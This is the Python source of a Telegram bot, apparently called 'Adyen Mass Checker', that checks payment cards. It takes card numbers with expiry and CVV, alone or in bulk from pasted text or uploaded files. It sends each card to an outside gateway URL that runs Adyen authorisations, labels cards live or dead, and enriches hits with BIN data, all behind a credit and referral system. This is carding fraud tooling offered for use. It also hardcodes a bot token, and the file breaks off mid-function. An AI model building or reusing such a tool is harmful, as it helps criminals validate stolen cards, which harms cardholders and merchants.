import telebot
from telebot import types
import requests
import time
from datetime import datetime
import re
import urllib.parse
import logging
import threading
import psutil
import os
import json
import signal
import sys
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request
import threading as th

# ============= CONFIGURATION =============
BOT_TOKEN = "8605254644:AAGTCIJxofpWNyy36tfA028wv6gFB_WdJHE"
ADMIN_ID = 7904483885
PORT = int(os.environ.get('PORT', 8080))

# Bot Status
MAINTENANCE_MODE = False
BOT_STOPPED = False

# Settings
MAX_THREADS = 3
THREAD_DELAY = 3
API_TIMEOUT = 30

# Credit system
CREDITS_FILE = "credits.json"
DEFAULT_CREDITS = 100
CREDITS_PER_CHECK = 1
CREDITS_RESET_HOURS = 1

# Storage
user_credits = {}
user_last_reset = {}
user_info = {}
pending_cards = {}  # {user_id: {'cards': list, 'remaining': list, 'total': int}}
BANNED_USERS = set()
BANNED_FILE = "banned_users.txt"
mass_tasks = {}

# Gateway
GATEWAY_URL = 'https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc='

# Flask app for Railway
app = Flask(__name__)

# ============= LOGGING =============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============= DATA MANAGEMENT =============
def load_credits():
    global user_credits, user_last_reset
    try:
        with open(CREDITS_FILE, 'r') as f:
            data = json.load(f)
            user_credits = data.get('credits', {})
            user_last_reset = data.get('last_reset', {})
    except:
        user_credits = {}
        user_last_reset = {}

def save_credits():
    with open(CREDITS_FILE, 'w') as f:
        json.dump({'credits': user_credits, 'last_reset': user_last_reset}, f)

def load_banned_users():
    try:
        with open(BANNED_FILE, 'r') as f:
            for line in f:
                BANNED_USERS.add(int(line.strip()))
    except:
        pass

def save_banned_users():
    with open(BANNED_FILE, 'w') as f:
        for uid in BANNED_USERS:
            f.write(f"{uid}\n")

load_banned_users()
load_credits()

# ============= CREDIT SYSTEM =============
def get_user_credits(user_id):
    if MAINTENANCE_MODE or BOT_STOPPED:
        return 0
    
    user_id = str(user_id)
    now = time.time()
    last_reset = user_last_reset.get(user_id, 0)
    
    if now - last_reset >= CREDITS_RESET_HOURS * 3600:
        user_credits[user_id] = DEFAULT_CREDITS
        user_last_reset[user_id] = now
        save_credits()
    
    return user_credits.get(user_id, DEFAULT_CREDITS)

def use_credit(user_id):
    if MAINTENANCE_MODE or BOT_STOPPED:
        return False
    
    user_id = str(user_id)
    now = time.time()
    last_reset = user_last_reset.get(user_id, 0)
    
    if now - last_reset >= CREDITS_RESET_HOURS * 3600:
        user_credits[user_id] = DEFAULT_CREDITS
        user_last_reset[user_id] = now
        save_credits()
    
    current = user_credits.get(user_id, DEFAULT_CREDITS)
    if current >= CREDITS_PER_CHECK:
        user_credits[user_id] = current - CREDITS_PER_CHECK
        save_credits()
        return True
    return False

def add_credits(user_id, amount):
    user_id = str(user_id)
    user_credits[user_id] = get_user_credits(int(user_id)) + amount
    save_credits()

def check_credits_before_mass(user_id, card_count):
    """Check if user has enough credits for mass check"""
    current = get_user_credits(user_id)
    needed = card_count * CREDITS_PER_CHECK
    
    if current >= needed:
        return True, current, needed
    else:
        return False, current, needed

def process_pending_cards(user_id, chat_id):
    """Process remaining cards after insufficient credits"""
    if user_id not in pending_cards:
        return
    
    pending = pending_cards[user_id]
    remaining = pending['remaining']
    
    if not remaining:
        del pending_cards[user_id]
        return
    
    # Check updated credits
    current = get_user_credits(user_id)
    needed = len(remaining) * CREDITS_PER_CHECK
    
    if current >= needed:
        # Now has enough credits, process remaining
        bot.send_message(chat_id, 
            f"<b>✅ CREDITS RESTORED</b>\n\n"
            f"Processing remaining {len(remaining)} cards...\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        
        # Process remaining cards
        start_mass_check_with_cards(chat_id, user_id, remaining)
        del pending_cards[user_id]
    else:
        # Still insufficient
        bot.send_message(chat_id,
            f"<b>⚠️ STILL INSUFFICIENT CREDITS</b>\n\n"
            f"Remaining cards: {len(remaining)}\n"
            f"Need: {needed} credits\n"
            f"Your credits: {current}\n"
            f"Shortage: {needed - current}\n\n"
            f"Get free credits from @lost_yashika\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')

# ============= UTILITY FUNCTIONS =============
def extract_cards(text):
    return re.findall(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', text)

def get_bin_info(bin_num):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
        return r.json() if r.status_code == 200 else {}
    except:
        return {}

def check_card(card):
    try:
        start = time.time()
        r = requests.get(GATEWAY_URL + urllib.parse.quote(card), timeout=API_TIMEOUT)
        elapsed = time.time() - start
        
        if r.status_code == 200:
            data = r.json()
            # Check if API says Card_Added
            response_text = data.get('response', '')
            if 'Card_Added' in response_text or 'added' in response_text.lower():
                data['status'] = 'Approved - Card Added'
            return {'card': card, 'success': True, 'data': data, 'elapsed': elapsed}
        return {'card': card, 'success': False, 'error': f'HTTP {r.status_code}'}
    except Exception as e:
        return {'card': card, 'success': False, 'error': str(e)[:50]}

# ============= MASS CHECK FUNCTIONS =============
def start_mass_check_with_cards(chat_id, user_id, cards):
    """Start mass check with given cards"""
    needed = len(cards) * CREDITS_PER_CHECK
    
    # Deduct credits
    for _ in range(len(cards)):
        use_credit(user_id)
    
    # Initialize mass task
    mass_tasks[chat_id] = {
        'cards': cards,
        'current': 0,
        'approved': 0,
        'declined': 0,
        'error': 0,
        'stop': False,
        'total': len(cards)
    }
    
    msg = bot.send_message(chat_id,
        f"<b>📦 MASS CHECK STARTED</b>\n\n"
        f"┌───⊷ <b>BATCH INFO</b>\n"
        f"├ Total Cards: {len(cards)}\n"
        f"├ Threads: {MAX_THREADS}x\n"
        f"├ Gateway: Adyen Auth\n"
        f"└ Cost: {needed} credits\n\n"
        f"┌───⊷ <b>PROGRESS</b>\n"
        f"├ ✅ Approved: 0\n"
        f"├ ❌ Declined: 0\n"
        f"├ ⚠️ Error: 0\n"
        f"└ 📊 Progress: 0/{len(cards)}\n\n"
        f"┌───⊷ <b>CONTROLS</b>\n"
        f"└ Use /stop to stop\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')
    
    mass_tasks[chat_id]['msg_id'] = msg.message_id
    
    # Process in background
    def process():
        task = mass_tasks.get(chat_id)
        if not task:
            return
        
        total = task['total']
        
        for i in range(0, total, MAX_THREADS):
            if task.get('stop') or BOT_STOPPED or MAINTENANCE_MODE:
                break
            
            batch = cards[i:i + MAX_THREADS]
            futures = []
            
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                for card in batch:
                    futures.append(executor.submit(check_card, card))
                
                for future in as_completed(futures):
                    if task.get('stop') or BOT_STOPPED or MAINTENANCE_MODE:
                        break
                    
                    result = future.result()
                    task['current'] += 1
                    
                    if result['success']:
                        status = result['data'].get('status', '').lower()
                        response_text = result['data'].get('response', '').lower()
                        
                        if 'approved' in status or 'live' in status or 'card_added' in response_text:
                            task['approved'] += 1
                            bin_info = get_bin_info(result['card'].split('|')[0])
                            approved_text = f"""<b>✅ CARD ADDED BY @Toenv</b>

┌───⊷ <b>CARD DETAILS</b>
├ 💳 <code>{result['card']}</code>
├ 🌐 Gateway: Adyen Auth
└ 📝 Response: {result['data'].get('response', 'Card Added Successfully')[:50]}

┌───⊷ <b>BIN INFO</b>
├ 🏦 {bin_info.get('bank', 'Unknown')}
├ 💳 {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')}
└ 🌍 {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}

┌───⊷ <b>TIME</b>
└ ⏱ {result['elapsed']:.2f}s

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
                            bot.send_message(chat_id, approved_text, parse_mode='HTML')
                        elif 'declined' in status or 'dead' in status:
                            task['declined'] += 1
                        else:
                            task['error'] += 1
                    else:
                        task['error'] += 1
                    
                    # Update status every 3 cards
                    if task['current'] % 3 == 0 or task['current'] == total:
                        try:
                            status_text = f"""<b>📦 MASS CHECK IN PROGRESS</b>

┌───⊷ <b>PROGRESS</b>
├ ✅ Approved: {task['approved']}
├ ❌ Declined: {task['declined']}
├ ⚠️ Error: {task['error']}
└ 📊 Progress: {task['current']}/{total}

┌───⊷ <b>PERFORMANCE</b>
├ 🧵 Threads: {MAX_THREADS}x
└ ⚡ Speed: Multi-threaded

┌───⊷ <b>CONTROLS</b>
└ Use /stop to stop

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
                            bot.edit_message_text(status_text, chat_id, task['msg_id'], parse_mode='HTML')
                        except:
                            pass
                    
                    time.sleep(0.1)
            
            if not task.get('stop') and not BOT_STOPPED and not MAINTENANCE_MODE:
                time.sleep(THREAD_DELAY)
        
        # Final summary
        final_text = f"""<b>📦 MASS CHECK {'STOPPED' if task.get('stop') else 'COMPLETED'}</b>

┌───⊷ <b>FINAL RESULTS</b>
├ ✅ Approved: {task['approved']}
├ ❌ Declined: {task['declined']}
├ ⚠️ Error: {task['error']}
└ 📊 Total: {total}

┌───⊷ <b>STATISTICS</b>
├ Success Rate: {round((task['approved']/total)*100, 2) if total > 0 else 0}%
└ Time: {datetime.now().strftime('%d/%m/%y %H:%M')}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
        
        try:
            bot.edit_message_text(final_text, chat_id, task['msg_id'], parse_mode='HTML')
        except:
            pass
        
        if chat_id in mass_tasks:
            del mass_tasks[chat_id]
    
    threading.Thread(target=process, daemon=True).start()

# ============= INLINE MENUS =============
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ Single Check", callback_data="single"),
        types.InlineKeyboardButton("📦 Mass Check", callback_data="mass")
    )
    markup.add(
        types.InlineKeyboardButton("💰 Credits", callback_data="credits"),
        types.InlineKeyboardButton("📊 My Info", callback_data="info")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 Free Credits", callback_data="free"),
        types.InlineKeyboardButton("🛑 Stop Mass", callback_data="stop")
    )
    return markup

def free_credits_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Channel (2000 credits)", callback_data="channel"),
        types.InlineKeyboardButton("👥 Invite Friend (200 credits)", callback_data="invite"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back")
    )
    return markup

# ============= BOT COMMANDS =============
@bot.message_handler(commands=['start'])
def start(message):
    if BOT_STOPPED:
        bot.reply_to(message, "🚫 Bot is currently stopped. Please try again later.")
        return
    
    if MAINTENANCE_MODE:
        bot.reply_to(message, "🔧 Bot is under maintenance. Please try again later.")
        return
    
    if is_banned(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned.\nContact @lost_yashika")
        return
    
    user_id = str(message.from_user.id)
    user_info[user_id] = {
        'name': message.from_user.first_name,
        'username': message.from_user.username,
        'joined': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    credits = get_user_credits(message.from_user.id)
    
    welcome_text = f"""<b>✨ Adyen Mass Checker ✨</b>

┌───⊷ <b>USER INFO</b>
├ ✅ Name: {message.from_user.first_name}
├ ✅ Username: @{message.from_user.username or 'None'}
├ ✅ ID: <code>{message.from_user.id}</code>
└ ✅ Credits: <code>{credits}</code>

┌───⊷ <b>BOT INFO</b>
├ ⚡ Gateway: Adyen Auth
├ 🧵 Threads: {MAX_THREADS}x
├ 💰 Cost: 1 credit/check
└ 🔄 Reset: Every {CREDITS_RESET_HOURS}h

┌───⊷ <b>COMMANDS</b>
├ /ady CC|MM|YY|CVV
├ /tady [cards or .txt]
├ /credits
├ /stop
└ /info

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""

    bot.reply_to(message, welcome_text, parse_mode='HTML', reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if BOT_STOPPED or MAINTENANCE_MODE:
        bot.answer_callback_query(call.id, "Bot is currently unavailable", show_alert=True)
        return
    
    user_id = call.from_user.id
    
    if call.data == "single":
        bot.answer_callback_query(call.id, "Send: /ady CC|MM|YY|CVV", show_alert=True)
    
    elif call.data == "mass":
        bot.answer_callback_query(call.id, "Send .txt file or cards\nUse: /tady", show_alert=True)
    
    elif call.data == "credits":
        credits = get_user_credits(user_id)
        bot.answer_callback_query(call.id, f"💰 Your Credits: {credits}", show_alert=True)
    
    elif call.data == "info":
        credits = get_user_credits(user_id)
        info_text = f"""<b>📊 YOUR INFO</b>

┌───⊷ <b>PERSONAL</b>
├ 👤 Name: {call.from_user.first_name}
├ 📛 Username: @{call.from_user.username or 'None'}
├ 🆔 ID: <code>{call.from_user.id}</code>
└ 📅 Joined: {user_info.get(str(user_id), {}).get('joined', 'Today')}

┌───⊷ <b>BOT STATS</b>
├ 💰 Credits: <code>{credits}</code>
├ ✅ Checks Used: {DEFAULT_CREDITS - credits}
└ 🔄 Reset: Every {CREDITS_RESET_HOURS}h

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
        
        bot.edit_message_text(info_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=main_menu())
    
    elif call.data == "free":
        bot.edit_message_text(
            "<b>🎁 GET FREE CREDITS</b>\n\nChoose your method:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=free_credits_menu()
        )
    
    elif call.data == "channel":
        bot.answer_callback_query(call.id, "Send bot to channel & screenshot to @lost_yashika", show_alert=True)
    
    elif call.data == "invite":
        bot.answer_callback_query(call.id, "Share bot link with friends!\nhttps://t.me/AdyenMassBot", show_alert=True)
    
    elif call.data == "stop":
        chat_id = call.message.chat.id
        if chat_id in mass_tasks:
            mass_tasks[chat_id]['stop'] = True
            bot.answer_callback_query(call.id, "🛑 Stopping mass check...", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active mass check", show_alert=True)
    
    elif call.data == "back":
        bot.edit_message_text(
            "<b>✨ Adyen Mass Checker ✨</b>\n\nChoose an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=main_menu()
        )

@bot.message_handler(commands=['ady'])
def single_check(message):
    if BOT_STOPPED:
        bot.reply_to(message, "🚫 Bot is currently stopped.")
        return
    
    if MAINTENANCE_MODE:
        bot.reply_to(message, "🔧 Bot is under maintenance.")
        return
    
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 Banned. Contact @lost_yashika")
        return
    
    if not use_credit(user_id):
        credits = get_user_credits(user_id)
        bot.reply_to(message,
            f"<b>⚠️ INSUFFICIENT CREDITS</b>\n\n"
            f"┌───⊷ <b>STATUS</b>\n"
            f"├ Your Credits: <code>{credits}</code>\n"
            f"├ Need: <code>{CREDITS_PER_CHECK}</code>\n"
            f"└ Shortage: <code>{CREDITS_PER_CHECK - credits if credits < CREDITS_PER_CHECK else 0}</code>\n\n"
            f"┌───⊷ <b>GET FREE CREDITS</b>\n"
            f"├ 📢 Send bot to channel → 2000 credits\n"
            f"├ 👥 Invite friend → 200 credits\n"
            f"└ Contact @lost_yashika\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, 
            "<b>⚠️ USAGE</b>\n\n"
            "Format: <code>/ady CC|MM|YY|CVV</code>\n\n"
            "Example: <code>/ady 4111111111111111|12|26|123</code>\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    card = parts[1]
    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card):
        bot.reply_to(message, 
            "<b>⚠️ INVALID FORMAT</b>\n\n"
            "Use: <code>CC|MM|YY|CVV</code>\n"
            "Example: <code>4111111111111111|12|26|123</code>\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    msg = bot.reply_to(message, "<b>⚡ PROCESSING...</b>\n\n<i>Checking card, please wait...</i>\n\n━━━━━━━━━━━━━━━━\n<i>Checked by @Toenv</i>\n<i>Dev @Toenv</i>", parse_mode='HTML')
    
    result = check_card(card)
    
    if result['success']:
        bin_info = get_bin_info(card.split('|')[0])
        status = result['data'].get('status', 'Unknown')
        response_text_api = result['data'].get('response', '')
        
        if 'approved' in status.lower() or 'live' in status.lower() or 'card_added' in response_text_api.lower():
            emoji = "✅"
            status_text = "CARD ADDED ✓"
        elif 'declined' in status.lower() or 'dead' in status.lower():
            emoji = "❌"
            status_text = "DEAD ✗"
        else:
            emoji = "⚠️"
            status_text = status.upper()
        
        remaining = get_user_credits(user_id)
        
        response_text = f"""<b>{emoji} {status_text}</b>

┌───⊷ <b>CARD DETAILS</b>
├ 💳 Card: <code>{card}</code>
├ 🌐 Gateway: Adyen Auth
└ 📝 Response: {response_text_api[:50]}

┌───⊷ <b>BIN INFORMATION</b>
├ 🏦 Bank: {bin_info.get('bank', 'Unknown')}
├ 💳 Type: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')}
├ 🌍 Country: {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}
└ 🎯 Level: {bin_info.get('level', 'Standard')}

┌───⊷ <b>STATISTICS</b>
├ ⏱ Time: {result['elapsed']:.2f}s
├ 💰 Credits Left: {remaining}
└ 📅 Date: {datetime.now().strftime('%d/%m/%y %H:%M')}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
        
        bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(
            f"<b>⚠️ ERROR</b>\n\n"
            f"┌───⊷ <b>DETAILS</b>\n"
            f"├ Card: <code>{card}</code>\n"
            f"├ Error: {result.get('error')}\n"
            f"└ Time: {datetime.now().strftime('%d/%m/%y %H:%M')}\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            message.chat.id, msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['tady'])
def mass_check(message):
    if BOT_STOPPED:
        bot.reply_to(message, "🚫 Bot is currently stopped.")
        return
    
    if MAINTENANCE_MODE:
        bot.reply_to(message, "🔧 Bot is under maintenance.")
        return
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 Banned. Contact @lost_yashika")
        return
    
    # Extract cards
    cards_text = ""
    if message.reply_to_message:
        if message.reply_to_message.document:
            file = bot.get_file(message.reply_to_message.document.file_id)
            cards_text = bot.download_file(file.file_path).decode('utf-8')
        else:
            cards_text = message.reply_to_message.text
    else:
        cards_text = message.text.replace('/tady', '').strip()
    
    cards = extract_cards(cards_text)
    
    if not cards:
        bot.reply_to(message,
            "<b>⚠️ NO CARDS FOUND</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "Methods:\n"
            "• Send as text message\n"
            "• Reply to .txt file\n"
            "• One card per line\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    # Check credits
    has_credits, current, needed = check_credits_before_mass(user_id, len(cards))
    
    if not has_credits:
        # Store remaining cards for later
        pending_cards[user_id] = {
            'cards': cards,
            'remaining': cards,
            'total': len(cards)
        }
        
        bot.reply_to(message,
            f"<b>⚠️ INSUFFICIENT CREDITS</b>\n\n"
            f"┌───⊷ <b>REQUIREMENTS</b>\n"
            f"├ Total Cards: {len(cards)}\n"
            f"├ Need: <code>{needed}</code> credits\n"
            f"├ Your Credits: <code>{current}</code>\n"
            f"└ Shortage: <code>{needed - current}</code>\n\n"
            f"┌───⊷ <b>PENDING CARDS</b>\n"
            f"├ {len(cards)} cards saved\n"
            f"└ Will process when credits available\n\n"
            f"┌───⊷ <b>GET FREE CREDITS</b>\n"
            f"├ 📢 Send bot to channel → 2000 credits\n"
            f"├ 👥 Invite friend → 200 credits\n"
            f"└ Contact @lost_yashika\n\n"
            f"┌───⊷ <b>CONTINUE</b>\n"
            f"└ Get credits and send /continue\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    start_mass_check_with_cards(chat_id, user_id, cards)

@bot.message_handler(commands=['continue'])
def continue_mass(message):
    """Continue pending mass check after getting credits"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id in pending_cards:
        process_pending_cards(user_id, chat_id)
    else:
        bot.reply_to(message,
            "<b>ℹ️ NO PENDING CARDS</b>\n\n"
            "You don't have any pending cards.\n"
            "Use /tady to start a new mass check.\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    chat_id = message.chat.id
    if chat_id in mass_tasks:
        mass_tasks[chat_id]['stop'] = True
        bot.reply_to(message,
            "<b>🛑 STOPPING MASS CHECK</b>\n\n"
            "Please wait, stopping current batch...\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
    else:
        bot.reply_to(message,
            "<b>ℹ️ NO ACTIVE MASS CHECK</b>\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')

@bot.message_handler(commands=['credits'])
def show_credits(message):
    credits = get_user_credits(message.from_user.id)
    bot.reply_to(message,
        f"<b>💰 CREDITS BALANCE</b>\n\n"
        f"┌───⊷ <b>YOUR BALANCE</b>\n"
        f"├ Available: <code>{credits}</code>\n"
        f"├ Used Today: <code>{DEFAULT_CREDITS - credits}</code>\n"
        f"└ Reset: Every {CREDITS_RESET_HOURS}h\n\n"
        f"┌───⊷ <b>GET FREE CREDITS</b>\n"
        f"├ 📢 Send bot to channel → 2000 credits\n"
        f"├ 👥 Invite friend → 200 credits\n"
        f"└ Contact @lost_yashika\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML', reply_markup=main_menu())

@bot.message_handler(commands=['info'])
def user_info_cmd(message):
    credits = get_user_credits(message.from_user.id)
    info_text = f"""<b>📊 YOUR INFO</b>

┌───⊷ <b>PERSONAL</b>
├ 👤 Name: {message.from_user.first_name}
├ 📛 Username: @{message.from_user.username or 'None'}
├ 🆔 ID: <code>{message.from_user.id}</code>
└ 📅 Joined: {user_info.get(str(message.from_user.id), {}).get('joined', 'Today')}

┌───⊷ <b>BOT STATS</b>
├ 💰 Credits: <code>{credits}</code>
├ ✅ Checks Used: {DEFAULT_CREDITS - credits}
├ ⚡ Cost: 1 credit/check
└ 🔄 Reset: Every {CREDITS_RESET_HOURS}h

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
    
    bot.reply_to(message, info_text, parse_mode='HTML', reply_markup=main_menu())

# ============= ADMIN COMMANDS =============
def is_admin(user_id):
    return user_id == ADMIN_ID

def is_banned(user_id):
    return user_id in BANNED_USERS

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Admin access only!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Users", callback_data="admin_users")
    )
    markup.add(
        types.InlineKeyboardButton("🔧 Maintenance", callback_data="admin_maintenance"),
        types.InlineKeyboardButton("🛑 Full Stop", callback_data="admin_stop")
    )
    markup.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("💰 Add Credits", callback_data="admin_addcr")
    )
    markup.add(
        types.InlineKeyboardButton("🚫 Ban/Unban", callback_data="admin_ban"),
        types.InlineKeyboardButton("🔄 Reset Credits", callback_data="admin_reset")
    )
    markup.add(
        types.InlineKeyboardButton("▶️ Start Bot", callback_data="admin_start"),
        types.InlineKeyboardButton("❌ Close", callback_data="admin_close")
    )
    
    status_text = "🟢 ONLINE" if not BOT_STOPPED and not MAINTENANCE_MODE else "🔴 OFFLINE" if BOT_STOPPED else "🟡 MAINTENANCE"
    
    bot.reply_to(message,
        f"<b>👑 ADMIN PANEL</b>\n\n"
        f"Bot Status: {status_text}\n"
        f"Active Mass: {len(mass_tasks)}\n"
        f"Total Users: {len(user_credits)}\n"
        f"Banned: {len(BANNED_USERS)}\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML', reply_markup=markup)

@bot.message_handler(commands=['fullstop'])
def full_stop(message):
    if not is_admin(message.from_user.id):
        return
    
    global BOT_STOPPED
    BOT_STOPPED = True
    
    # Stop all mass tasks
    for chat_id in mass_tasks:
        mass_tasks[chat_id]['stop'] = True
    
    bot.reply_to(message,
        "<b>🛑 BOT FULLY STOPPED</b>\n\n"
        "Bot is now in STOPPED mode.\n"
        "Use /startbot to resume.\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')

@bot.message_handler(commands=['startbot'])
def start_bot(message):
    if not is_admin(message.from_user.id):
        return
    
    global BOT_STOPPED, MAINTENANCE_MODE
    BOT_STOPPED = False
    MAINTENANCE_MODE = False
    
    bot.reply_to(message,
        "<b>▶️ BOT STARTED</b>\n\n"
        "Bot is now fully operational.\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')

@bot.message_handler(commands=['maintenance'])
def maintenance_mode(message):
    if not is_admin(message.from_user.id):
        return
    
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    
    status = "ENABLED 🔧" if MAINTENANCE_MODE else "DISABLED ✅"
    
    bot.reply_to(message,
        f"<b>🔧 MAINTENANCE MODE {status}</b>\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /ban <user_id>")
        return
    
    try:
        uid = int(parts[1])
        BANNED_USERS.add(uid)
        save_banned_users()
        bot.reply_to(message, f"✅ Banned user: {uid}")
    except:
        bot.reply_to(message, "Invalid ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /unban <user_id>")
        return
    
    try:
        uid = int(parts[1])
        BANNED_USERS.discard(uid)
        save_banned_users()
        bot.reply_to(message, f"✅ Unbanned user: {uid}")
    except:
        bot.reply_to(message, "Invalid ID")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    if not is_admin(message.from_user.id):
        return
    
    total_users = len(user_credits)
    active_mass = len(mass_tasks)
    
    bot.reply_to(message,
        f"<b>📊 BOT STATISTICS</b>\n\n"
        f"┌───⊷ <b>USER STATS</b>\n"
        f"├ Total Users: {total_users}\n"
        f"├ Active Mass: {active_mass}\n"
        f"├ Banned Users: {len(BANNED_USERS)}\n"
        f"└ Pending Cards: {len(pending_cards)}\n\n"
        f"┌───⊷ <b>SYSTEM STATS</b>\n"
        f"├ CPU: {psutil.cpu_percent()}%\n"
        f"├ RAM: {psutil.virtual_memory().percent}%\n"
        f"├ Bot Status: {'STOPPED' if BOT_STOPPED else 'MAINTENANCE' if MAINTENANCE_MODE else 'RUNNING'}\n"
        f"└ Threads: {MAX_THREADS}x\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')

@bot.message_handler(commands=['addcr'])
def add_credits_admin(message):
    if not is_admin(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /addcr <user_id> <amount>")
        return
    
    try:
        uid = int(parts[1])
        amt = int(parts[2])
        add_credits(uid, amt)
        bot.reply_to(message, f"✅ Added {amt} credits to user {uid}")
        
        # Check if user has pending cards
        if uid in pending_cards:
            bot.send_message(uid, 
                "<b>✅ CREDITS ADDED</b>\n\n"
                f"{amt} credits have been added to your account.\n"
                f"Use /continue to process your pending {len(pending_cards[uid]['remaining'])} cards.\n\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"<i>Checked by @Toenv</i>\n"
                f"<i>Dev @Toenv</i>",
